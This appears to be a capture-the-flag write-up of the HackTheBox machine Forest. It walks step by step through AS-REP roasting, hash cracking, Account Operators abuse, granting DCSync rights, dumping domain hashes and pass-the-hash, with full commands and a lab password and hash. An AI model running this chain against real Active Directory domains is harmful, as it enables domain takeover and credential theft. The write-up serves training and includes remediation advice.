---
title: "HackTheBox: Forest - AS-REP Roasting & DCSync Attack"
date: 2026-02-21
draft: false
description: "Walkthrough of HackTheBox Forest, exploiting Active Directory misconfigurations through AS-REP Roasting, Account Operators abuse, and DCSync attack to gain Domain Admin."
tags: ["hackthebox", "windows", "active-directory", "kerberos", "dcsync", "asrep-roasting"]
---

## Introduction

Forest is a Windows Active Directory Domain Controller on HackTheBox. This box demonstrates common AD misconfigurations and attack paths including AS-REP Roasting, privileged group abuse, and DCSync attacks.

**Difficulty:** Easy  
**OS:** Windows Server 2016  
**Skills:** AD Enumeration, AS-REP Roasting, Privilege Escalation, DCSync

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -Pn 10.129.1.248
```

Key findings:

| Port | Service | Significance |
|------|---------|--------------|
| 53 | DNS | Domain Controller |
| 88 | Kerberos | AD Authentication |
| 135 | RPC | Windows RPC |
| 389/3268 | LDAP | AD Directory |
| 445 | SMB | File sharing |
| 5985 | WinRM | Remote management |

**Domain:** `htb.local`  
**Computer:** `FOREST.htb.local`

This is clearly an Active Directory Domain Controller.

---

## Enumeration

### User Enumeration via RPC

First, I added the domain to my hosts file:
```bash
echo "10.129.1.248 htb.local forest.htb.local" | sudo tee -a /etc/hosts
```

Then enumerated users via RPC null session:
```bash
rpcclient -U "" -N 10.129.1.248 -c "enumdomusers"
```

![User enumeration showing svc-alfresco account](/images/htb-forest/forest_1.png)

Found several users including a service account: `svc-alfresco`

---

## AS-REP Roasting

### What is AS-REP Roasting?

When a user has "Do not require Kerberos preauthentication" enabled, we can request an encrypted TGT without knowing their password. The TGT is encrypted with the user's password hash, which we can crack offline.

### Requesting the Hash
```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.1.248 -no-pass -format hashcat
```

![AS-REP hash retrieved for svc-alfresco](/images/htb-forest/forest_2.png)

Got a hash for `svc-alfresco`!

### Cracking the Hash
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

![Hashcat cracking the AS-REP hash - password is s3rvice](/images/htb-forest/forest_3.png)

**Password found:** `s3rvice`

---

## Initial Access

### WinRM Connection

With valid credentials, I connected via Evil-WinRM:
```bash
evil-winrm -i 10.129.1.248 -u svc-alfresco -p 's3rvice'
```

### User Flag
```bash
cd C:\Users\svc-alfresco\Desktop
type user.txt
```

---

## Privilege Escalation

### Enumerating Group Memberships
```bash
whoami /all
```

![svc-alfresco group memberships showing Account Operators](/images/htb-forest/forest_4.png)

**Key finding:** `svc-alfresco` is a member of `Account Operators`!

### Account Operators Privilege

The `Account Operators` group can:
- Create and modify user accounts
- Add users to most groups
- Cannot directly modify Domain Admins, but can abuse other paths

### Attack Path
```bash
Account Operators
       │
       ▼
Create new user "hacker"
       │
       ▼
Add to "Exchange Windows Permissions"
       │
       ▼
Grant DCSync rights
       │
       ▼
Dump Administrator hash
       │
       ▼
Pass-the-Hash → Domain Admin
```

---

## Executing the Attack

### Step 1: Create a New User
```powershell
net user hacker Password123! /add /domain
```

### Step 2: Add to Exchange Windows Permissions
```powershell
net group "Exchange Windows Permissions" hacker /add /domain
```

### Step 3: Grant DCSync Rights

The `Exchange Windows Permissions` group has WriteDacl on the domain. I used impacket to grant DCSync rights:
```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'hacker' -target-dn 'DC=htb,DC=local' 'htb.local/hacker:Password123!' -dc-ip 10.129.1.248
```

![DCSync rights granted successfully](/images/htb-forest/forest_5.png)

### Step 4: DCSync Attack
```bash
impacket-secretsdump htb.local/hacker:'Password123!'@10.129.1.248
```

Output:
```bash
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Step 5: Pass-the-Hash
```bash
evil-winrm -i 10.129.1.248 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```

### Root Flag
```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

---

## Key Concepts Explained

### AS-REP Roasting

| Step | Description |
|------|-------------|
| 1 | User has "Do not require Kerberos preauthentication" set |
| 2 | Attacker requests TGT without password |
| 3 | DC returns encrypted ticket |
| 4 | Attacker cracks offline to get password |

### DCSync Attack

| Step | Description |
|------|-------------|
| 1 | Attacker has Replicating Directory Changes rights |
| 2 | Attacker impersonates a Domain Controller |
| 3 | Requests password data via replication |
| 4 | DC sends all password hashes |

### Why This Worked

| Misconfiguration | Impact |
|------------------|--------|
| Pre-auth disabled on svc-alfresco | AS-REP Roasting possible |
| Weak password (s3rvice) | Easy to crack |
| svc-alfresco in Account Operators | Can create users and modify groups |
| Exchange Windows Permissions has WriteDacl | Can grant DCSync rights |

---

## Defensive Measures

| Issue | Remediation |
|-------|-------------|
| AS-REP Roasting | Require pre-authentication for all accounts |
| Weak passwords | Enforce strong password policy |
| Account Operators membership | Limit privileged group membership |
| Exchange permissions | Audit and remove unnecessary AD permissions |
| Service accounts | Use Group Managed Service Accounts (gMSA) |

---

## Tools Used

- Nmap
- rpcclient
- Impacket (GetNPUsers, dacledit, secretsdump)
- Hashcat
- Evil-WinRM

---

## Lessons Learned

1. **Service accounts are targets** — They often have weak passwords and excessive privileges
2. **Group memberships matter** — Account Operators can lead to domain compromise
3. **Exchange groups are dangerous** — Exchange Windows Permissions has powerful AD rights
4. **DCSync is devastating** — Once you have DCSync rights, you own the domain

---

## References

- [AS-REP Roasting - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [DCSync Attack - MITRE ATT&CK](https://attack.mitre.org/techniques/T1003/006/)
- [Account Operators Abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)

---

*This writeup is for educational purposes. Only test on systems you have permission to access.*
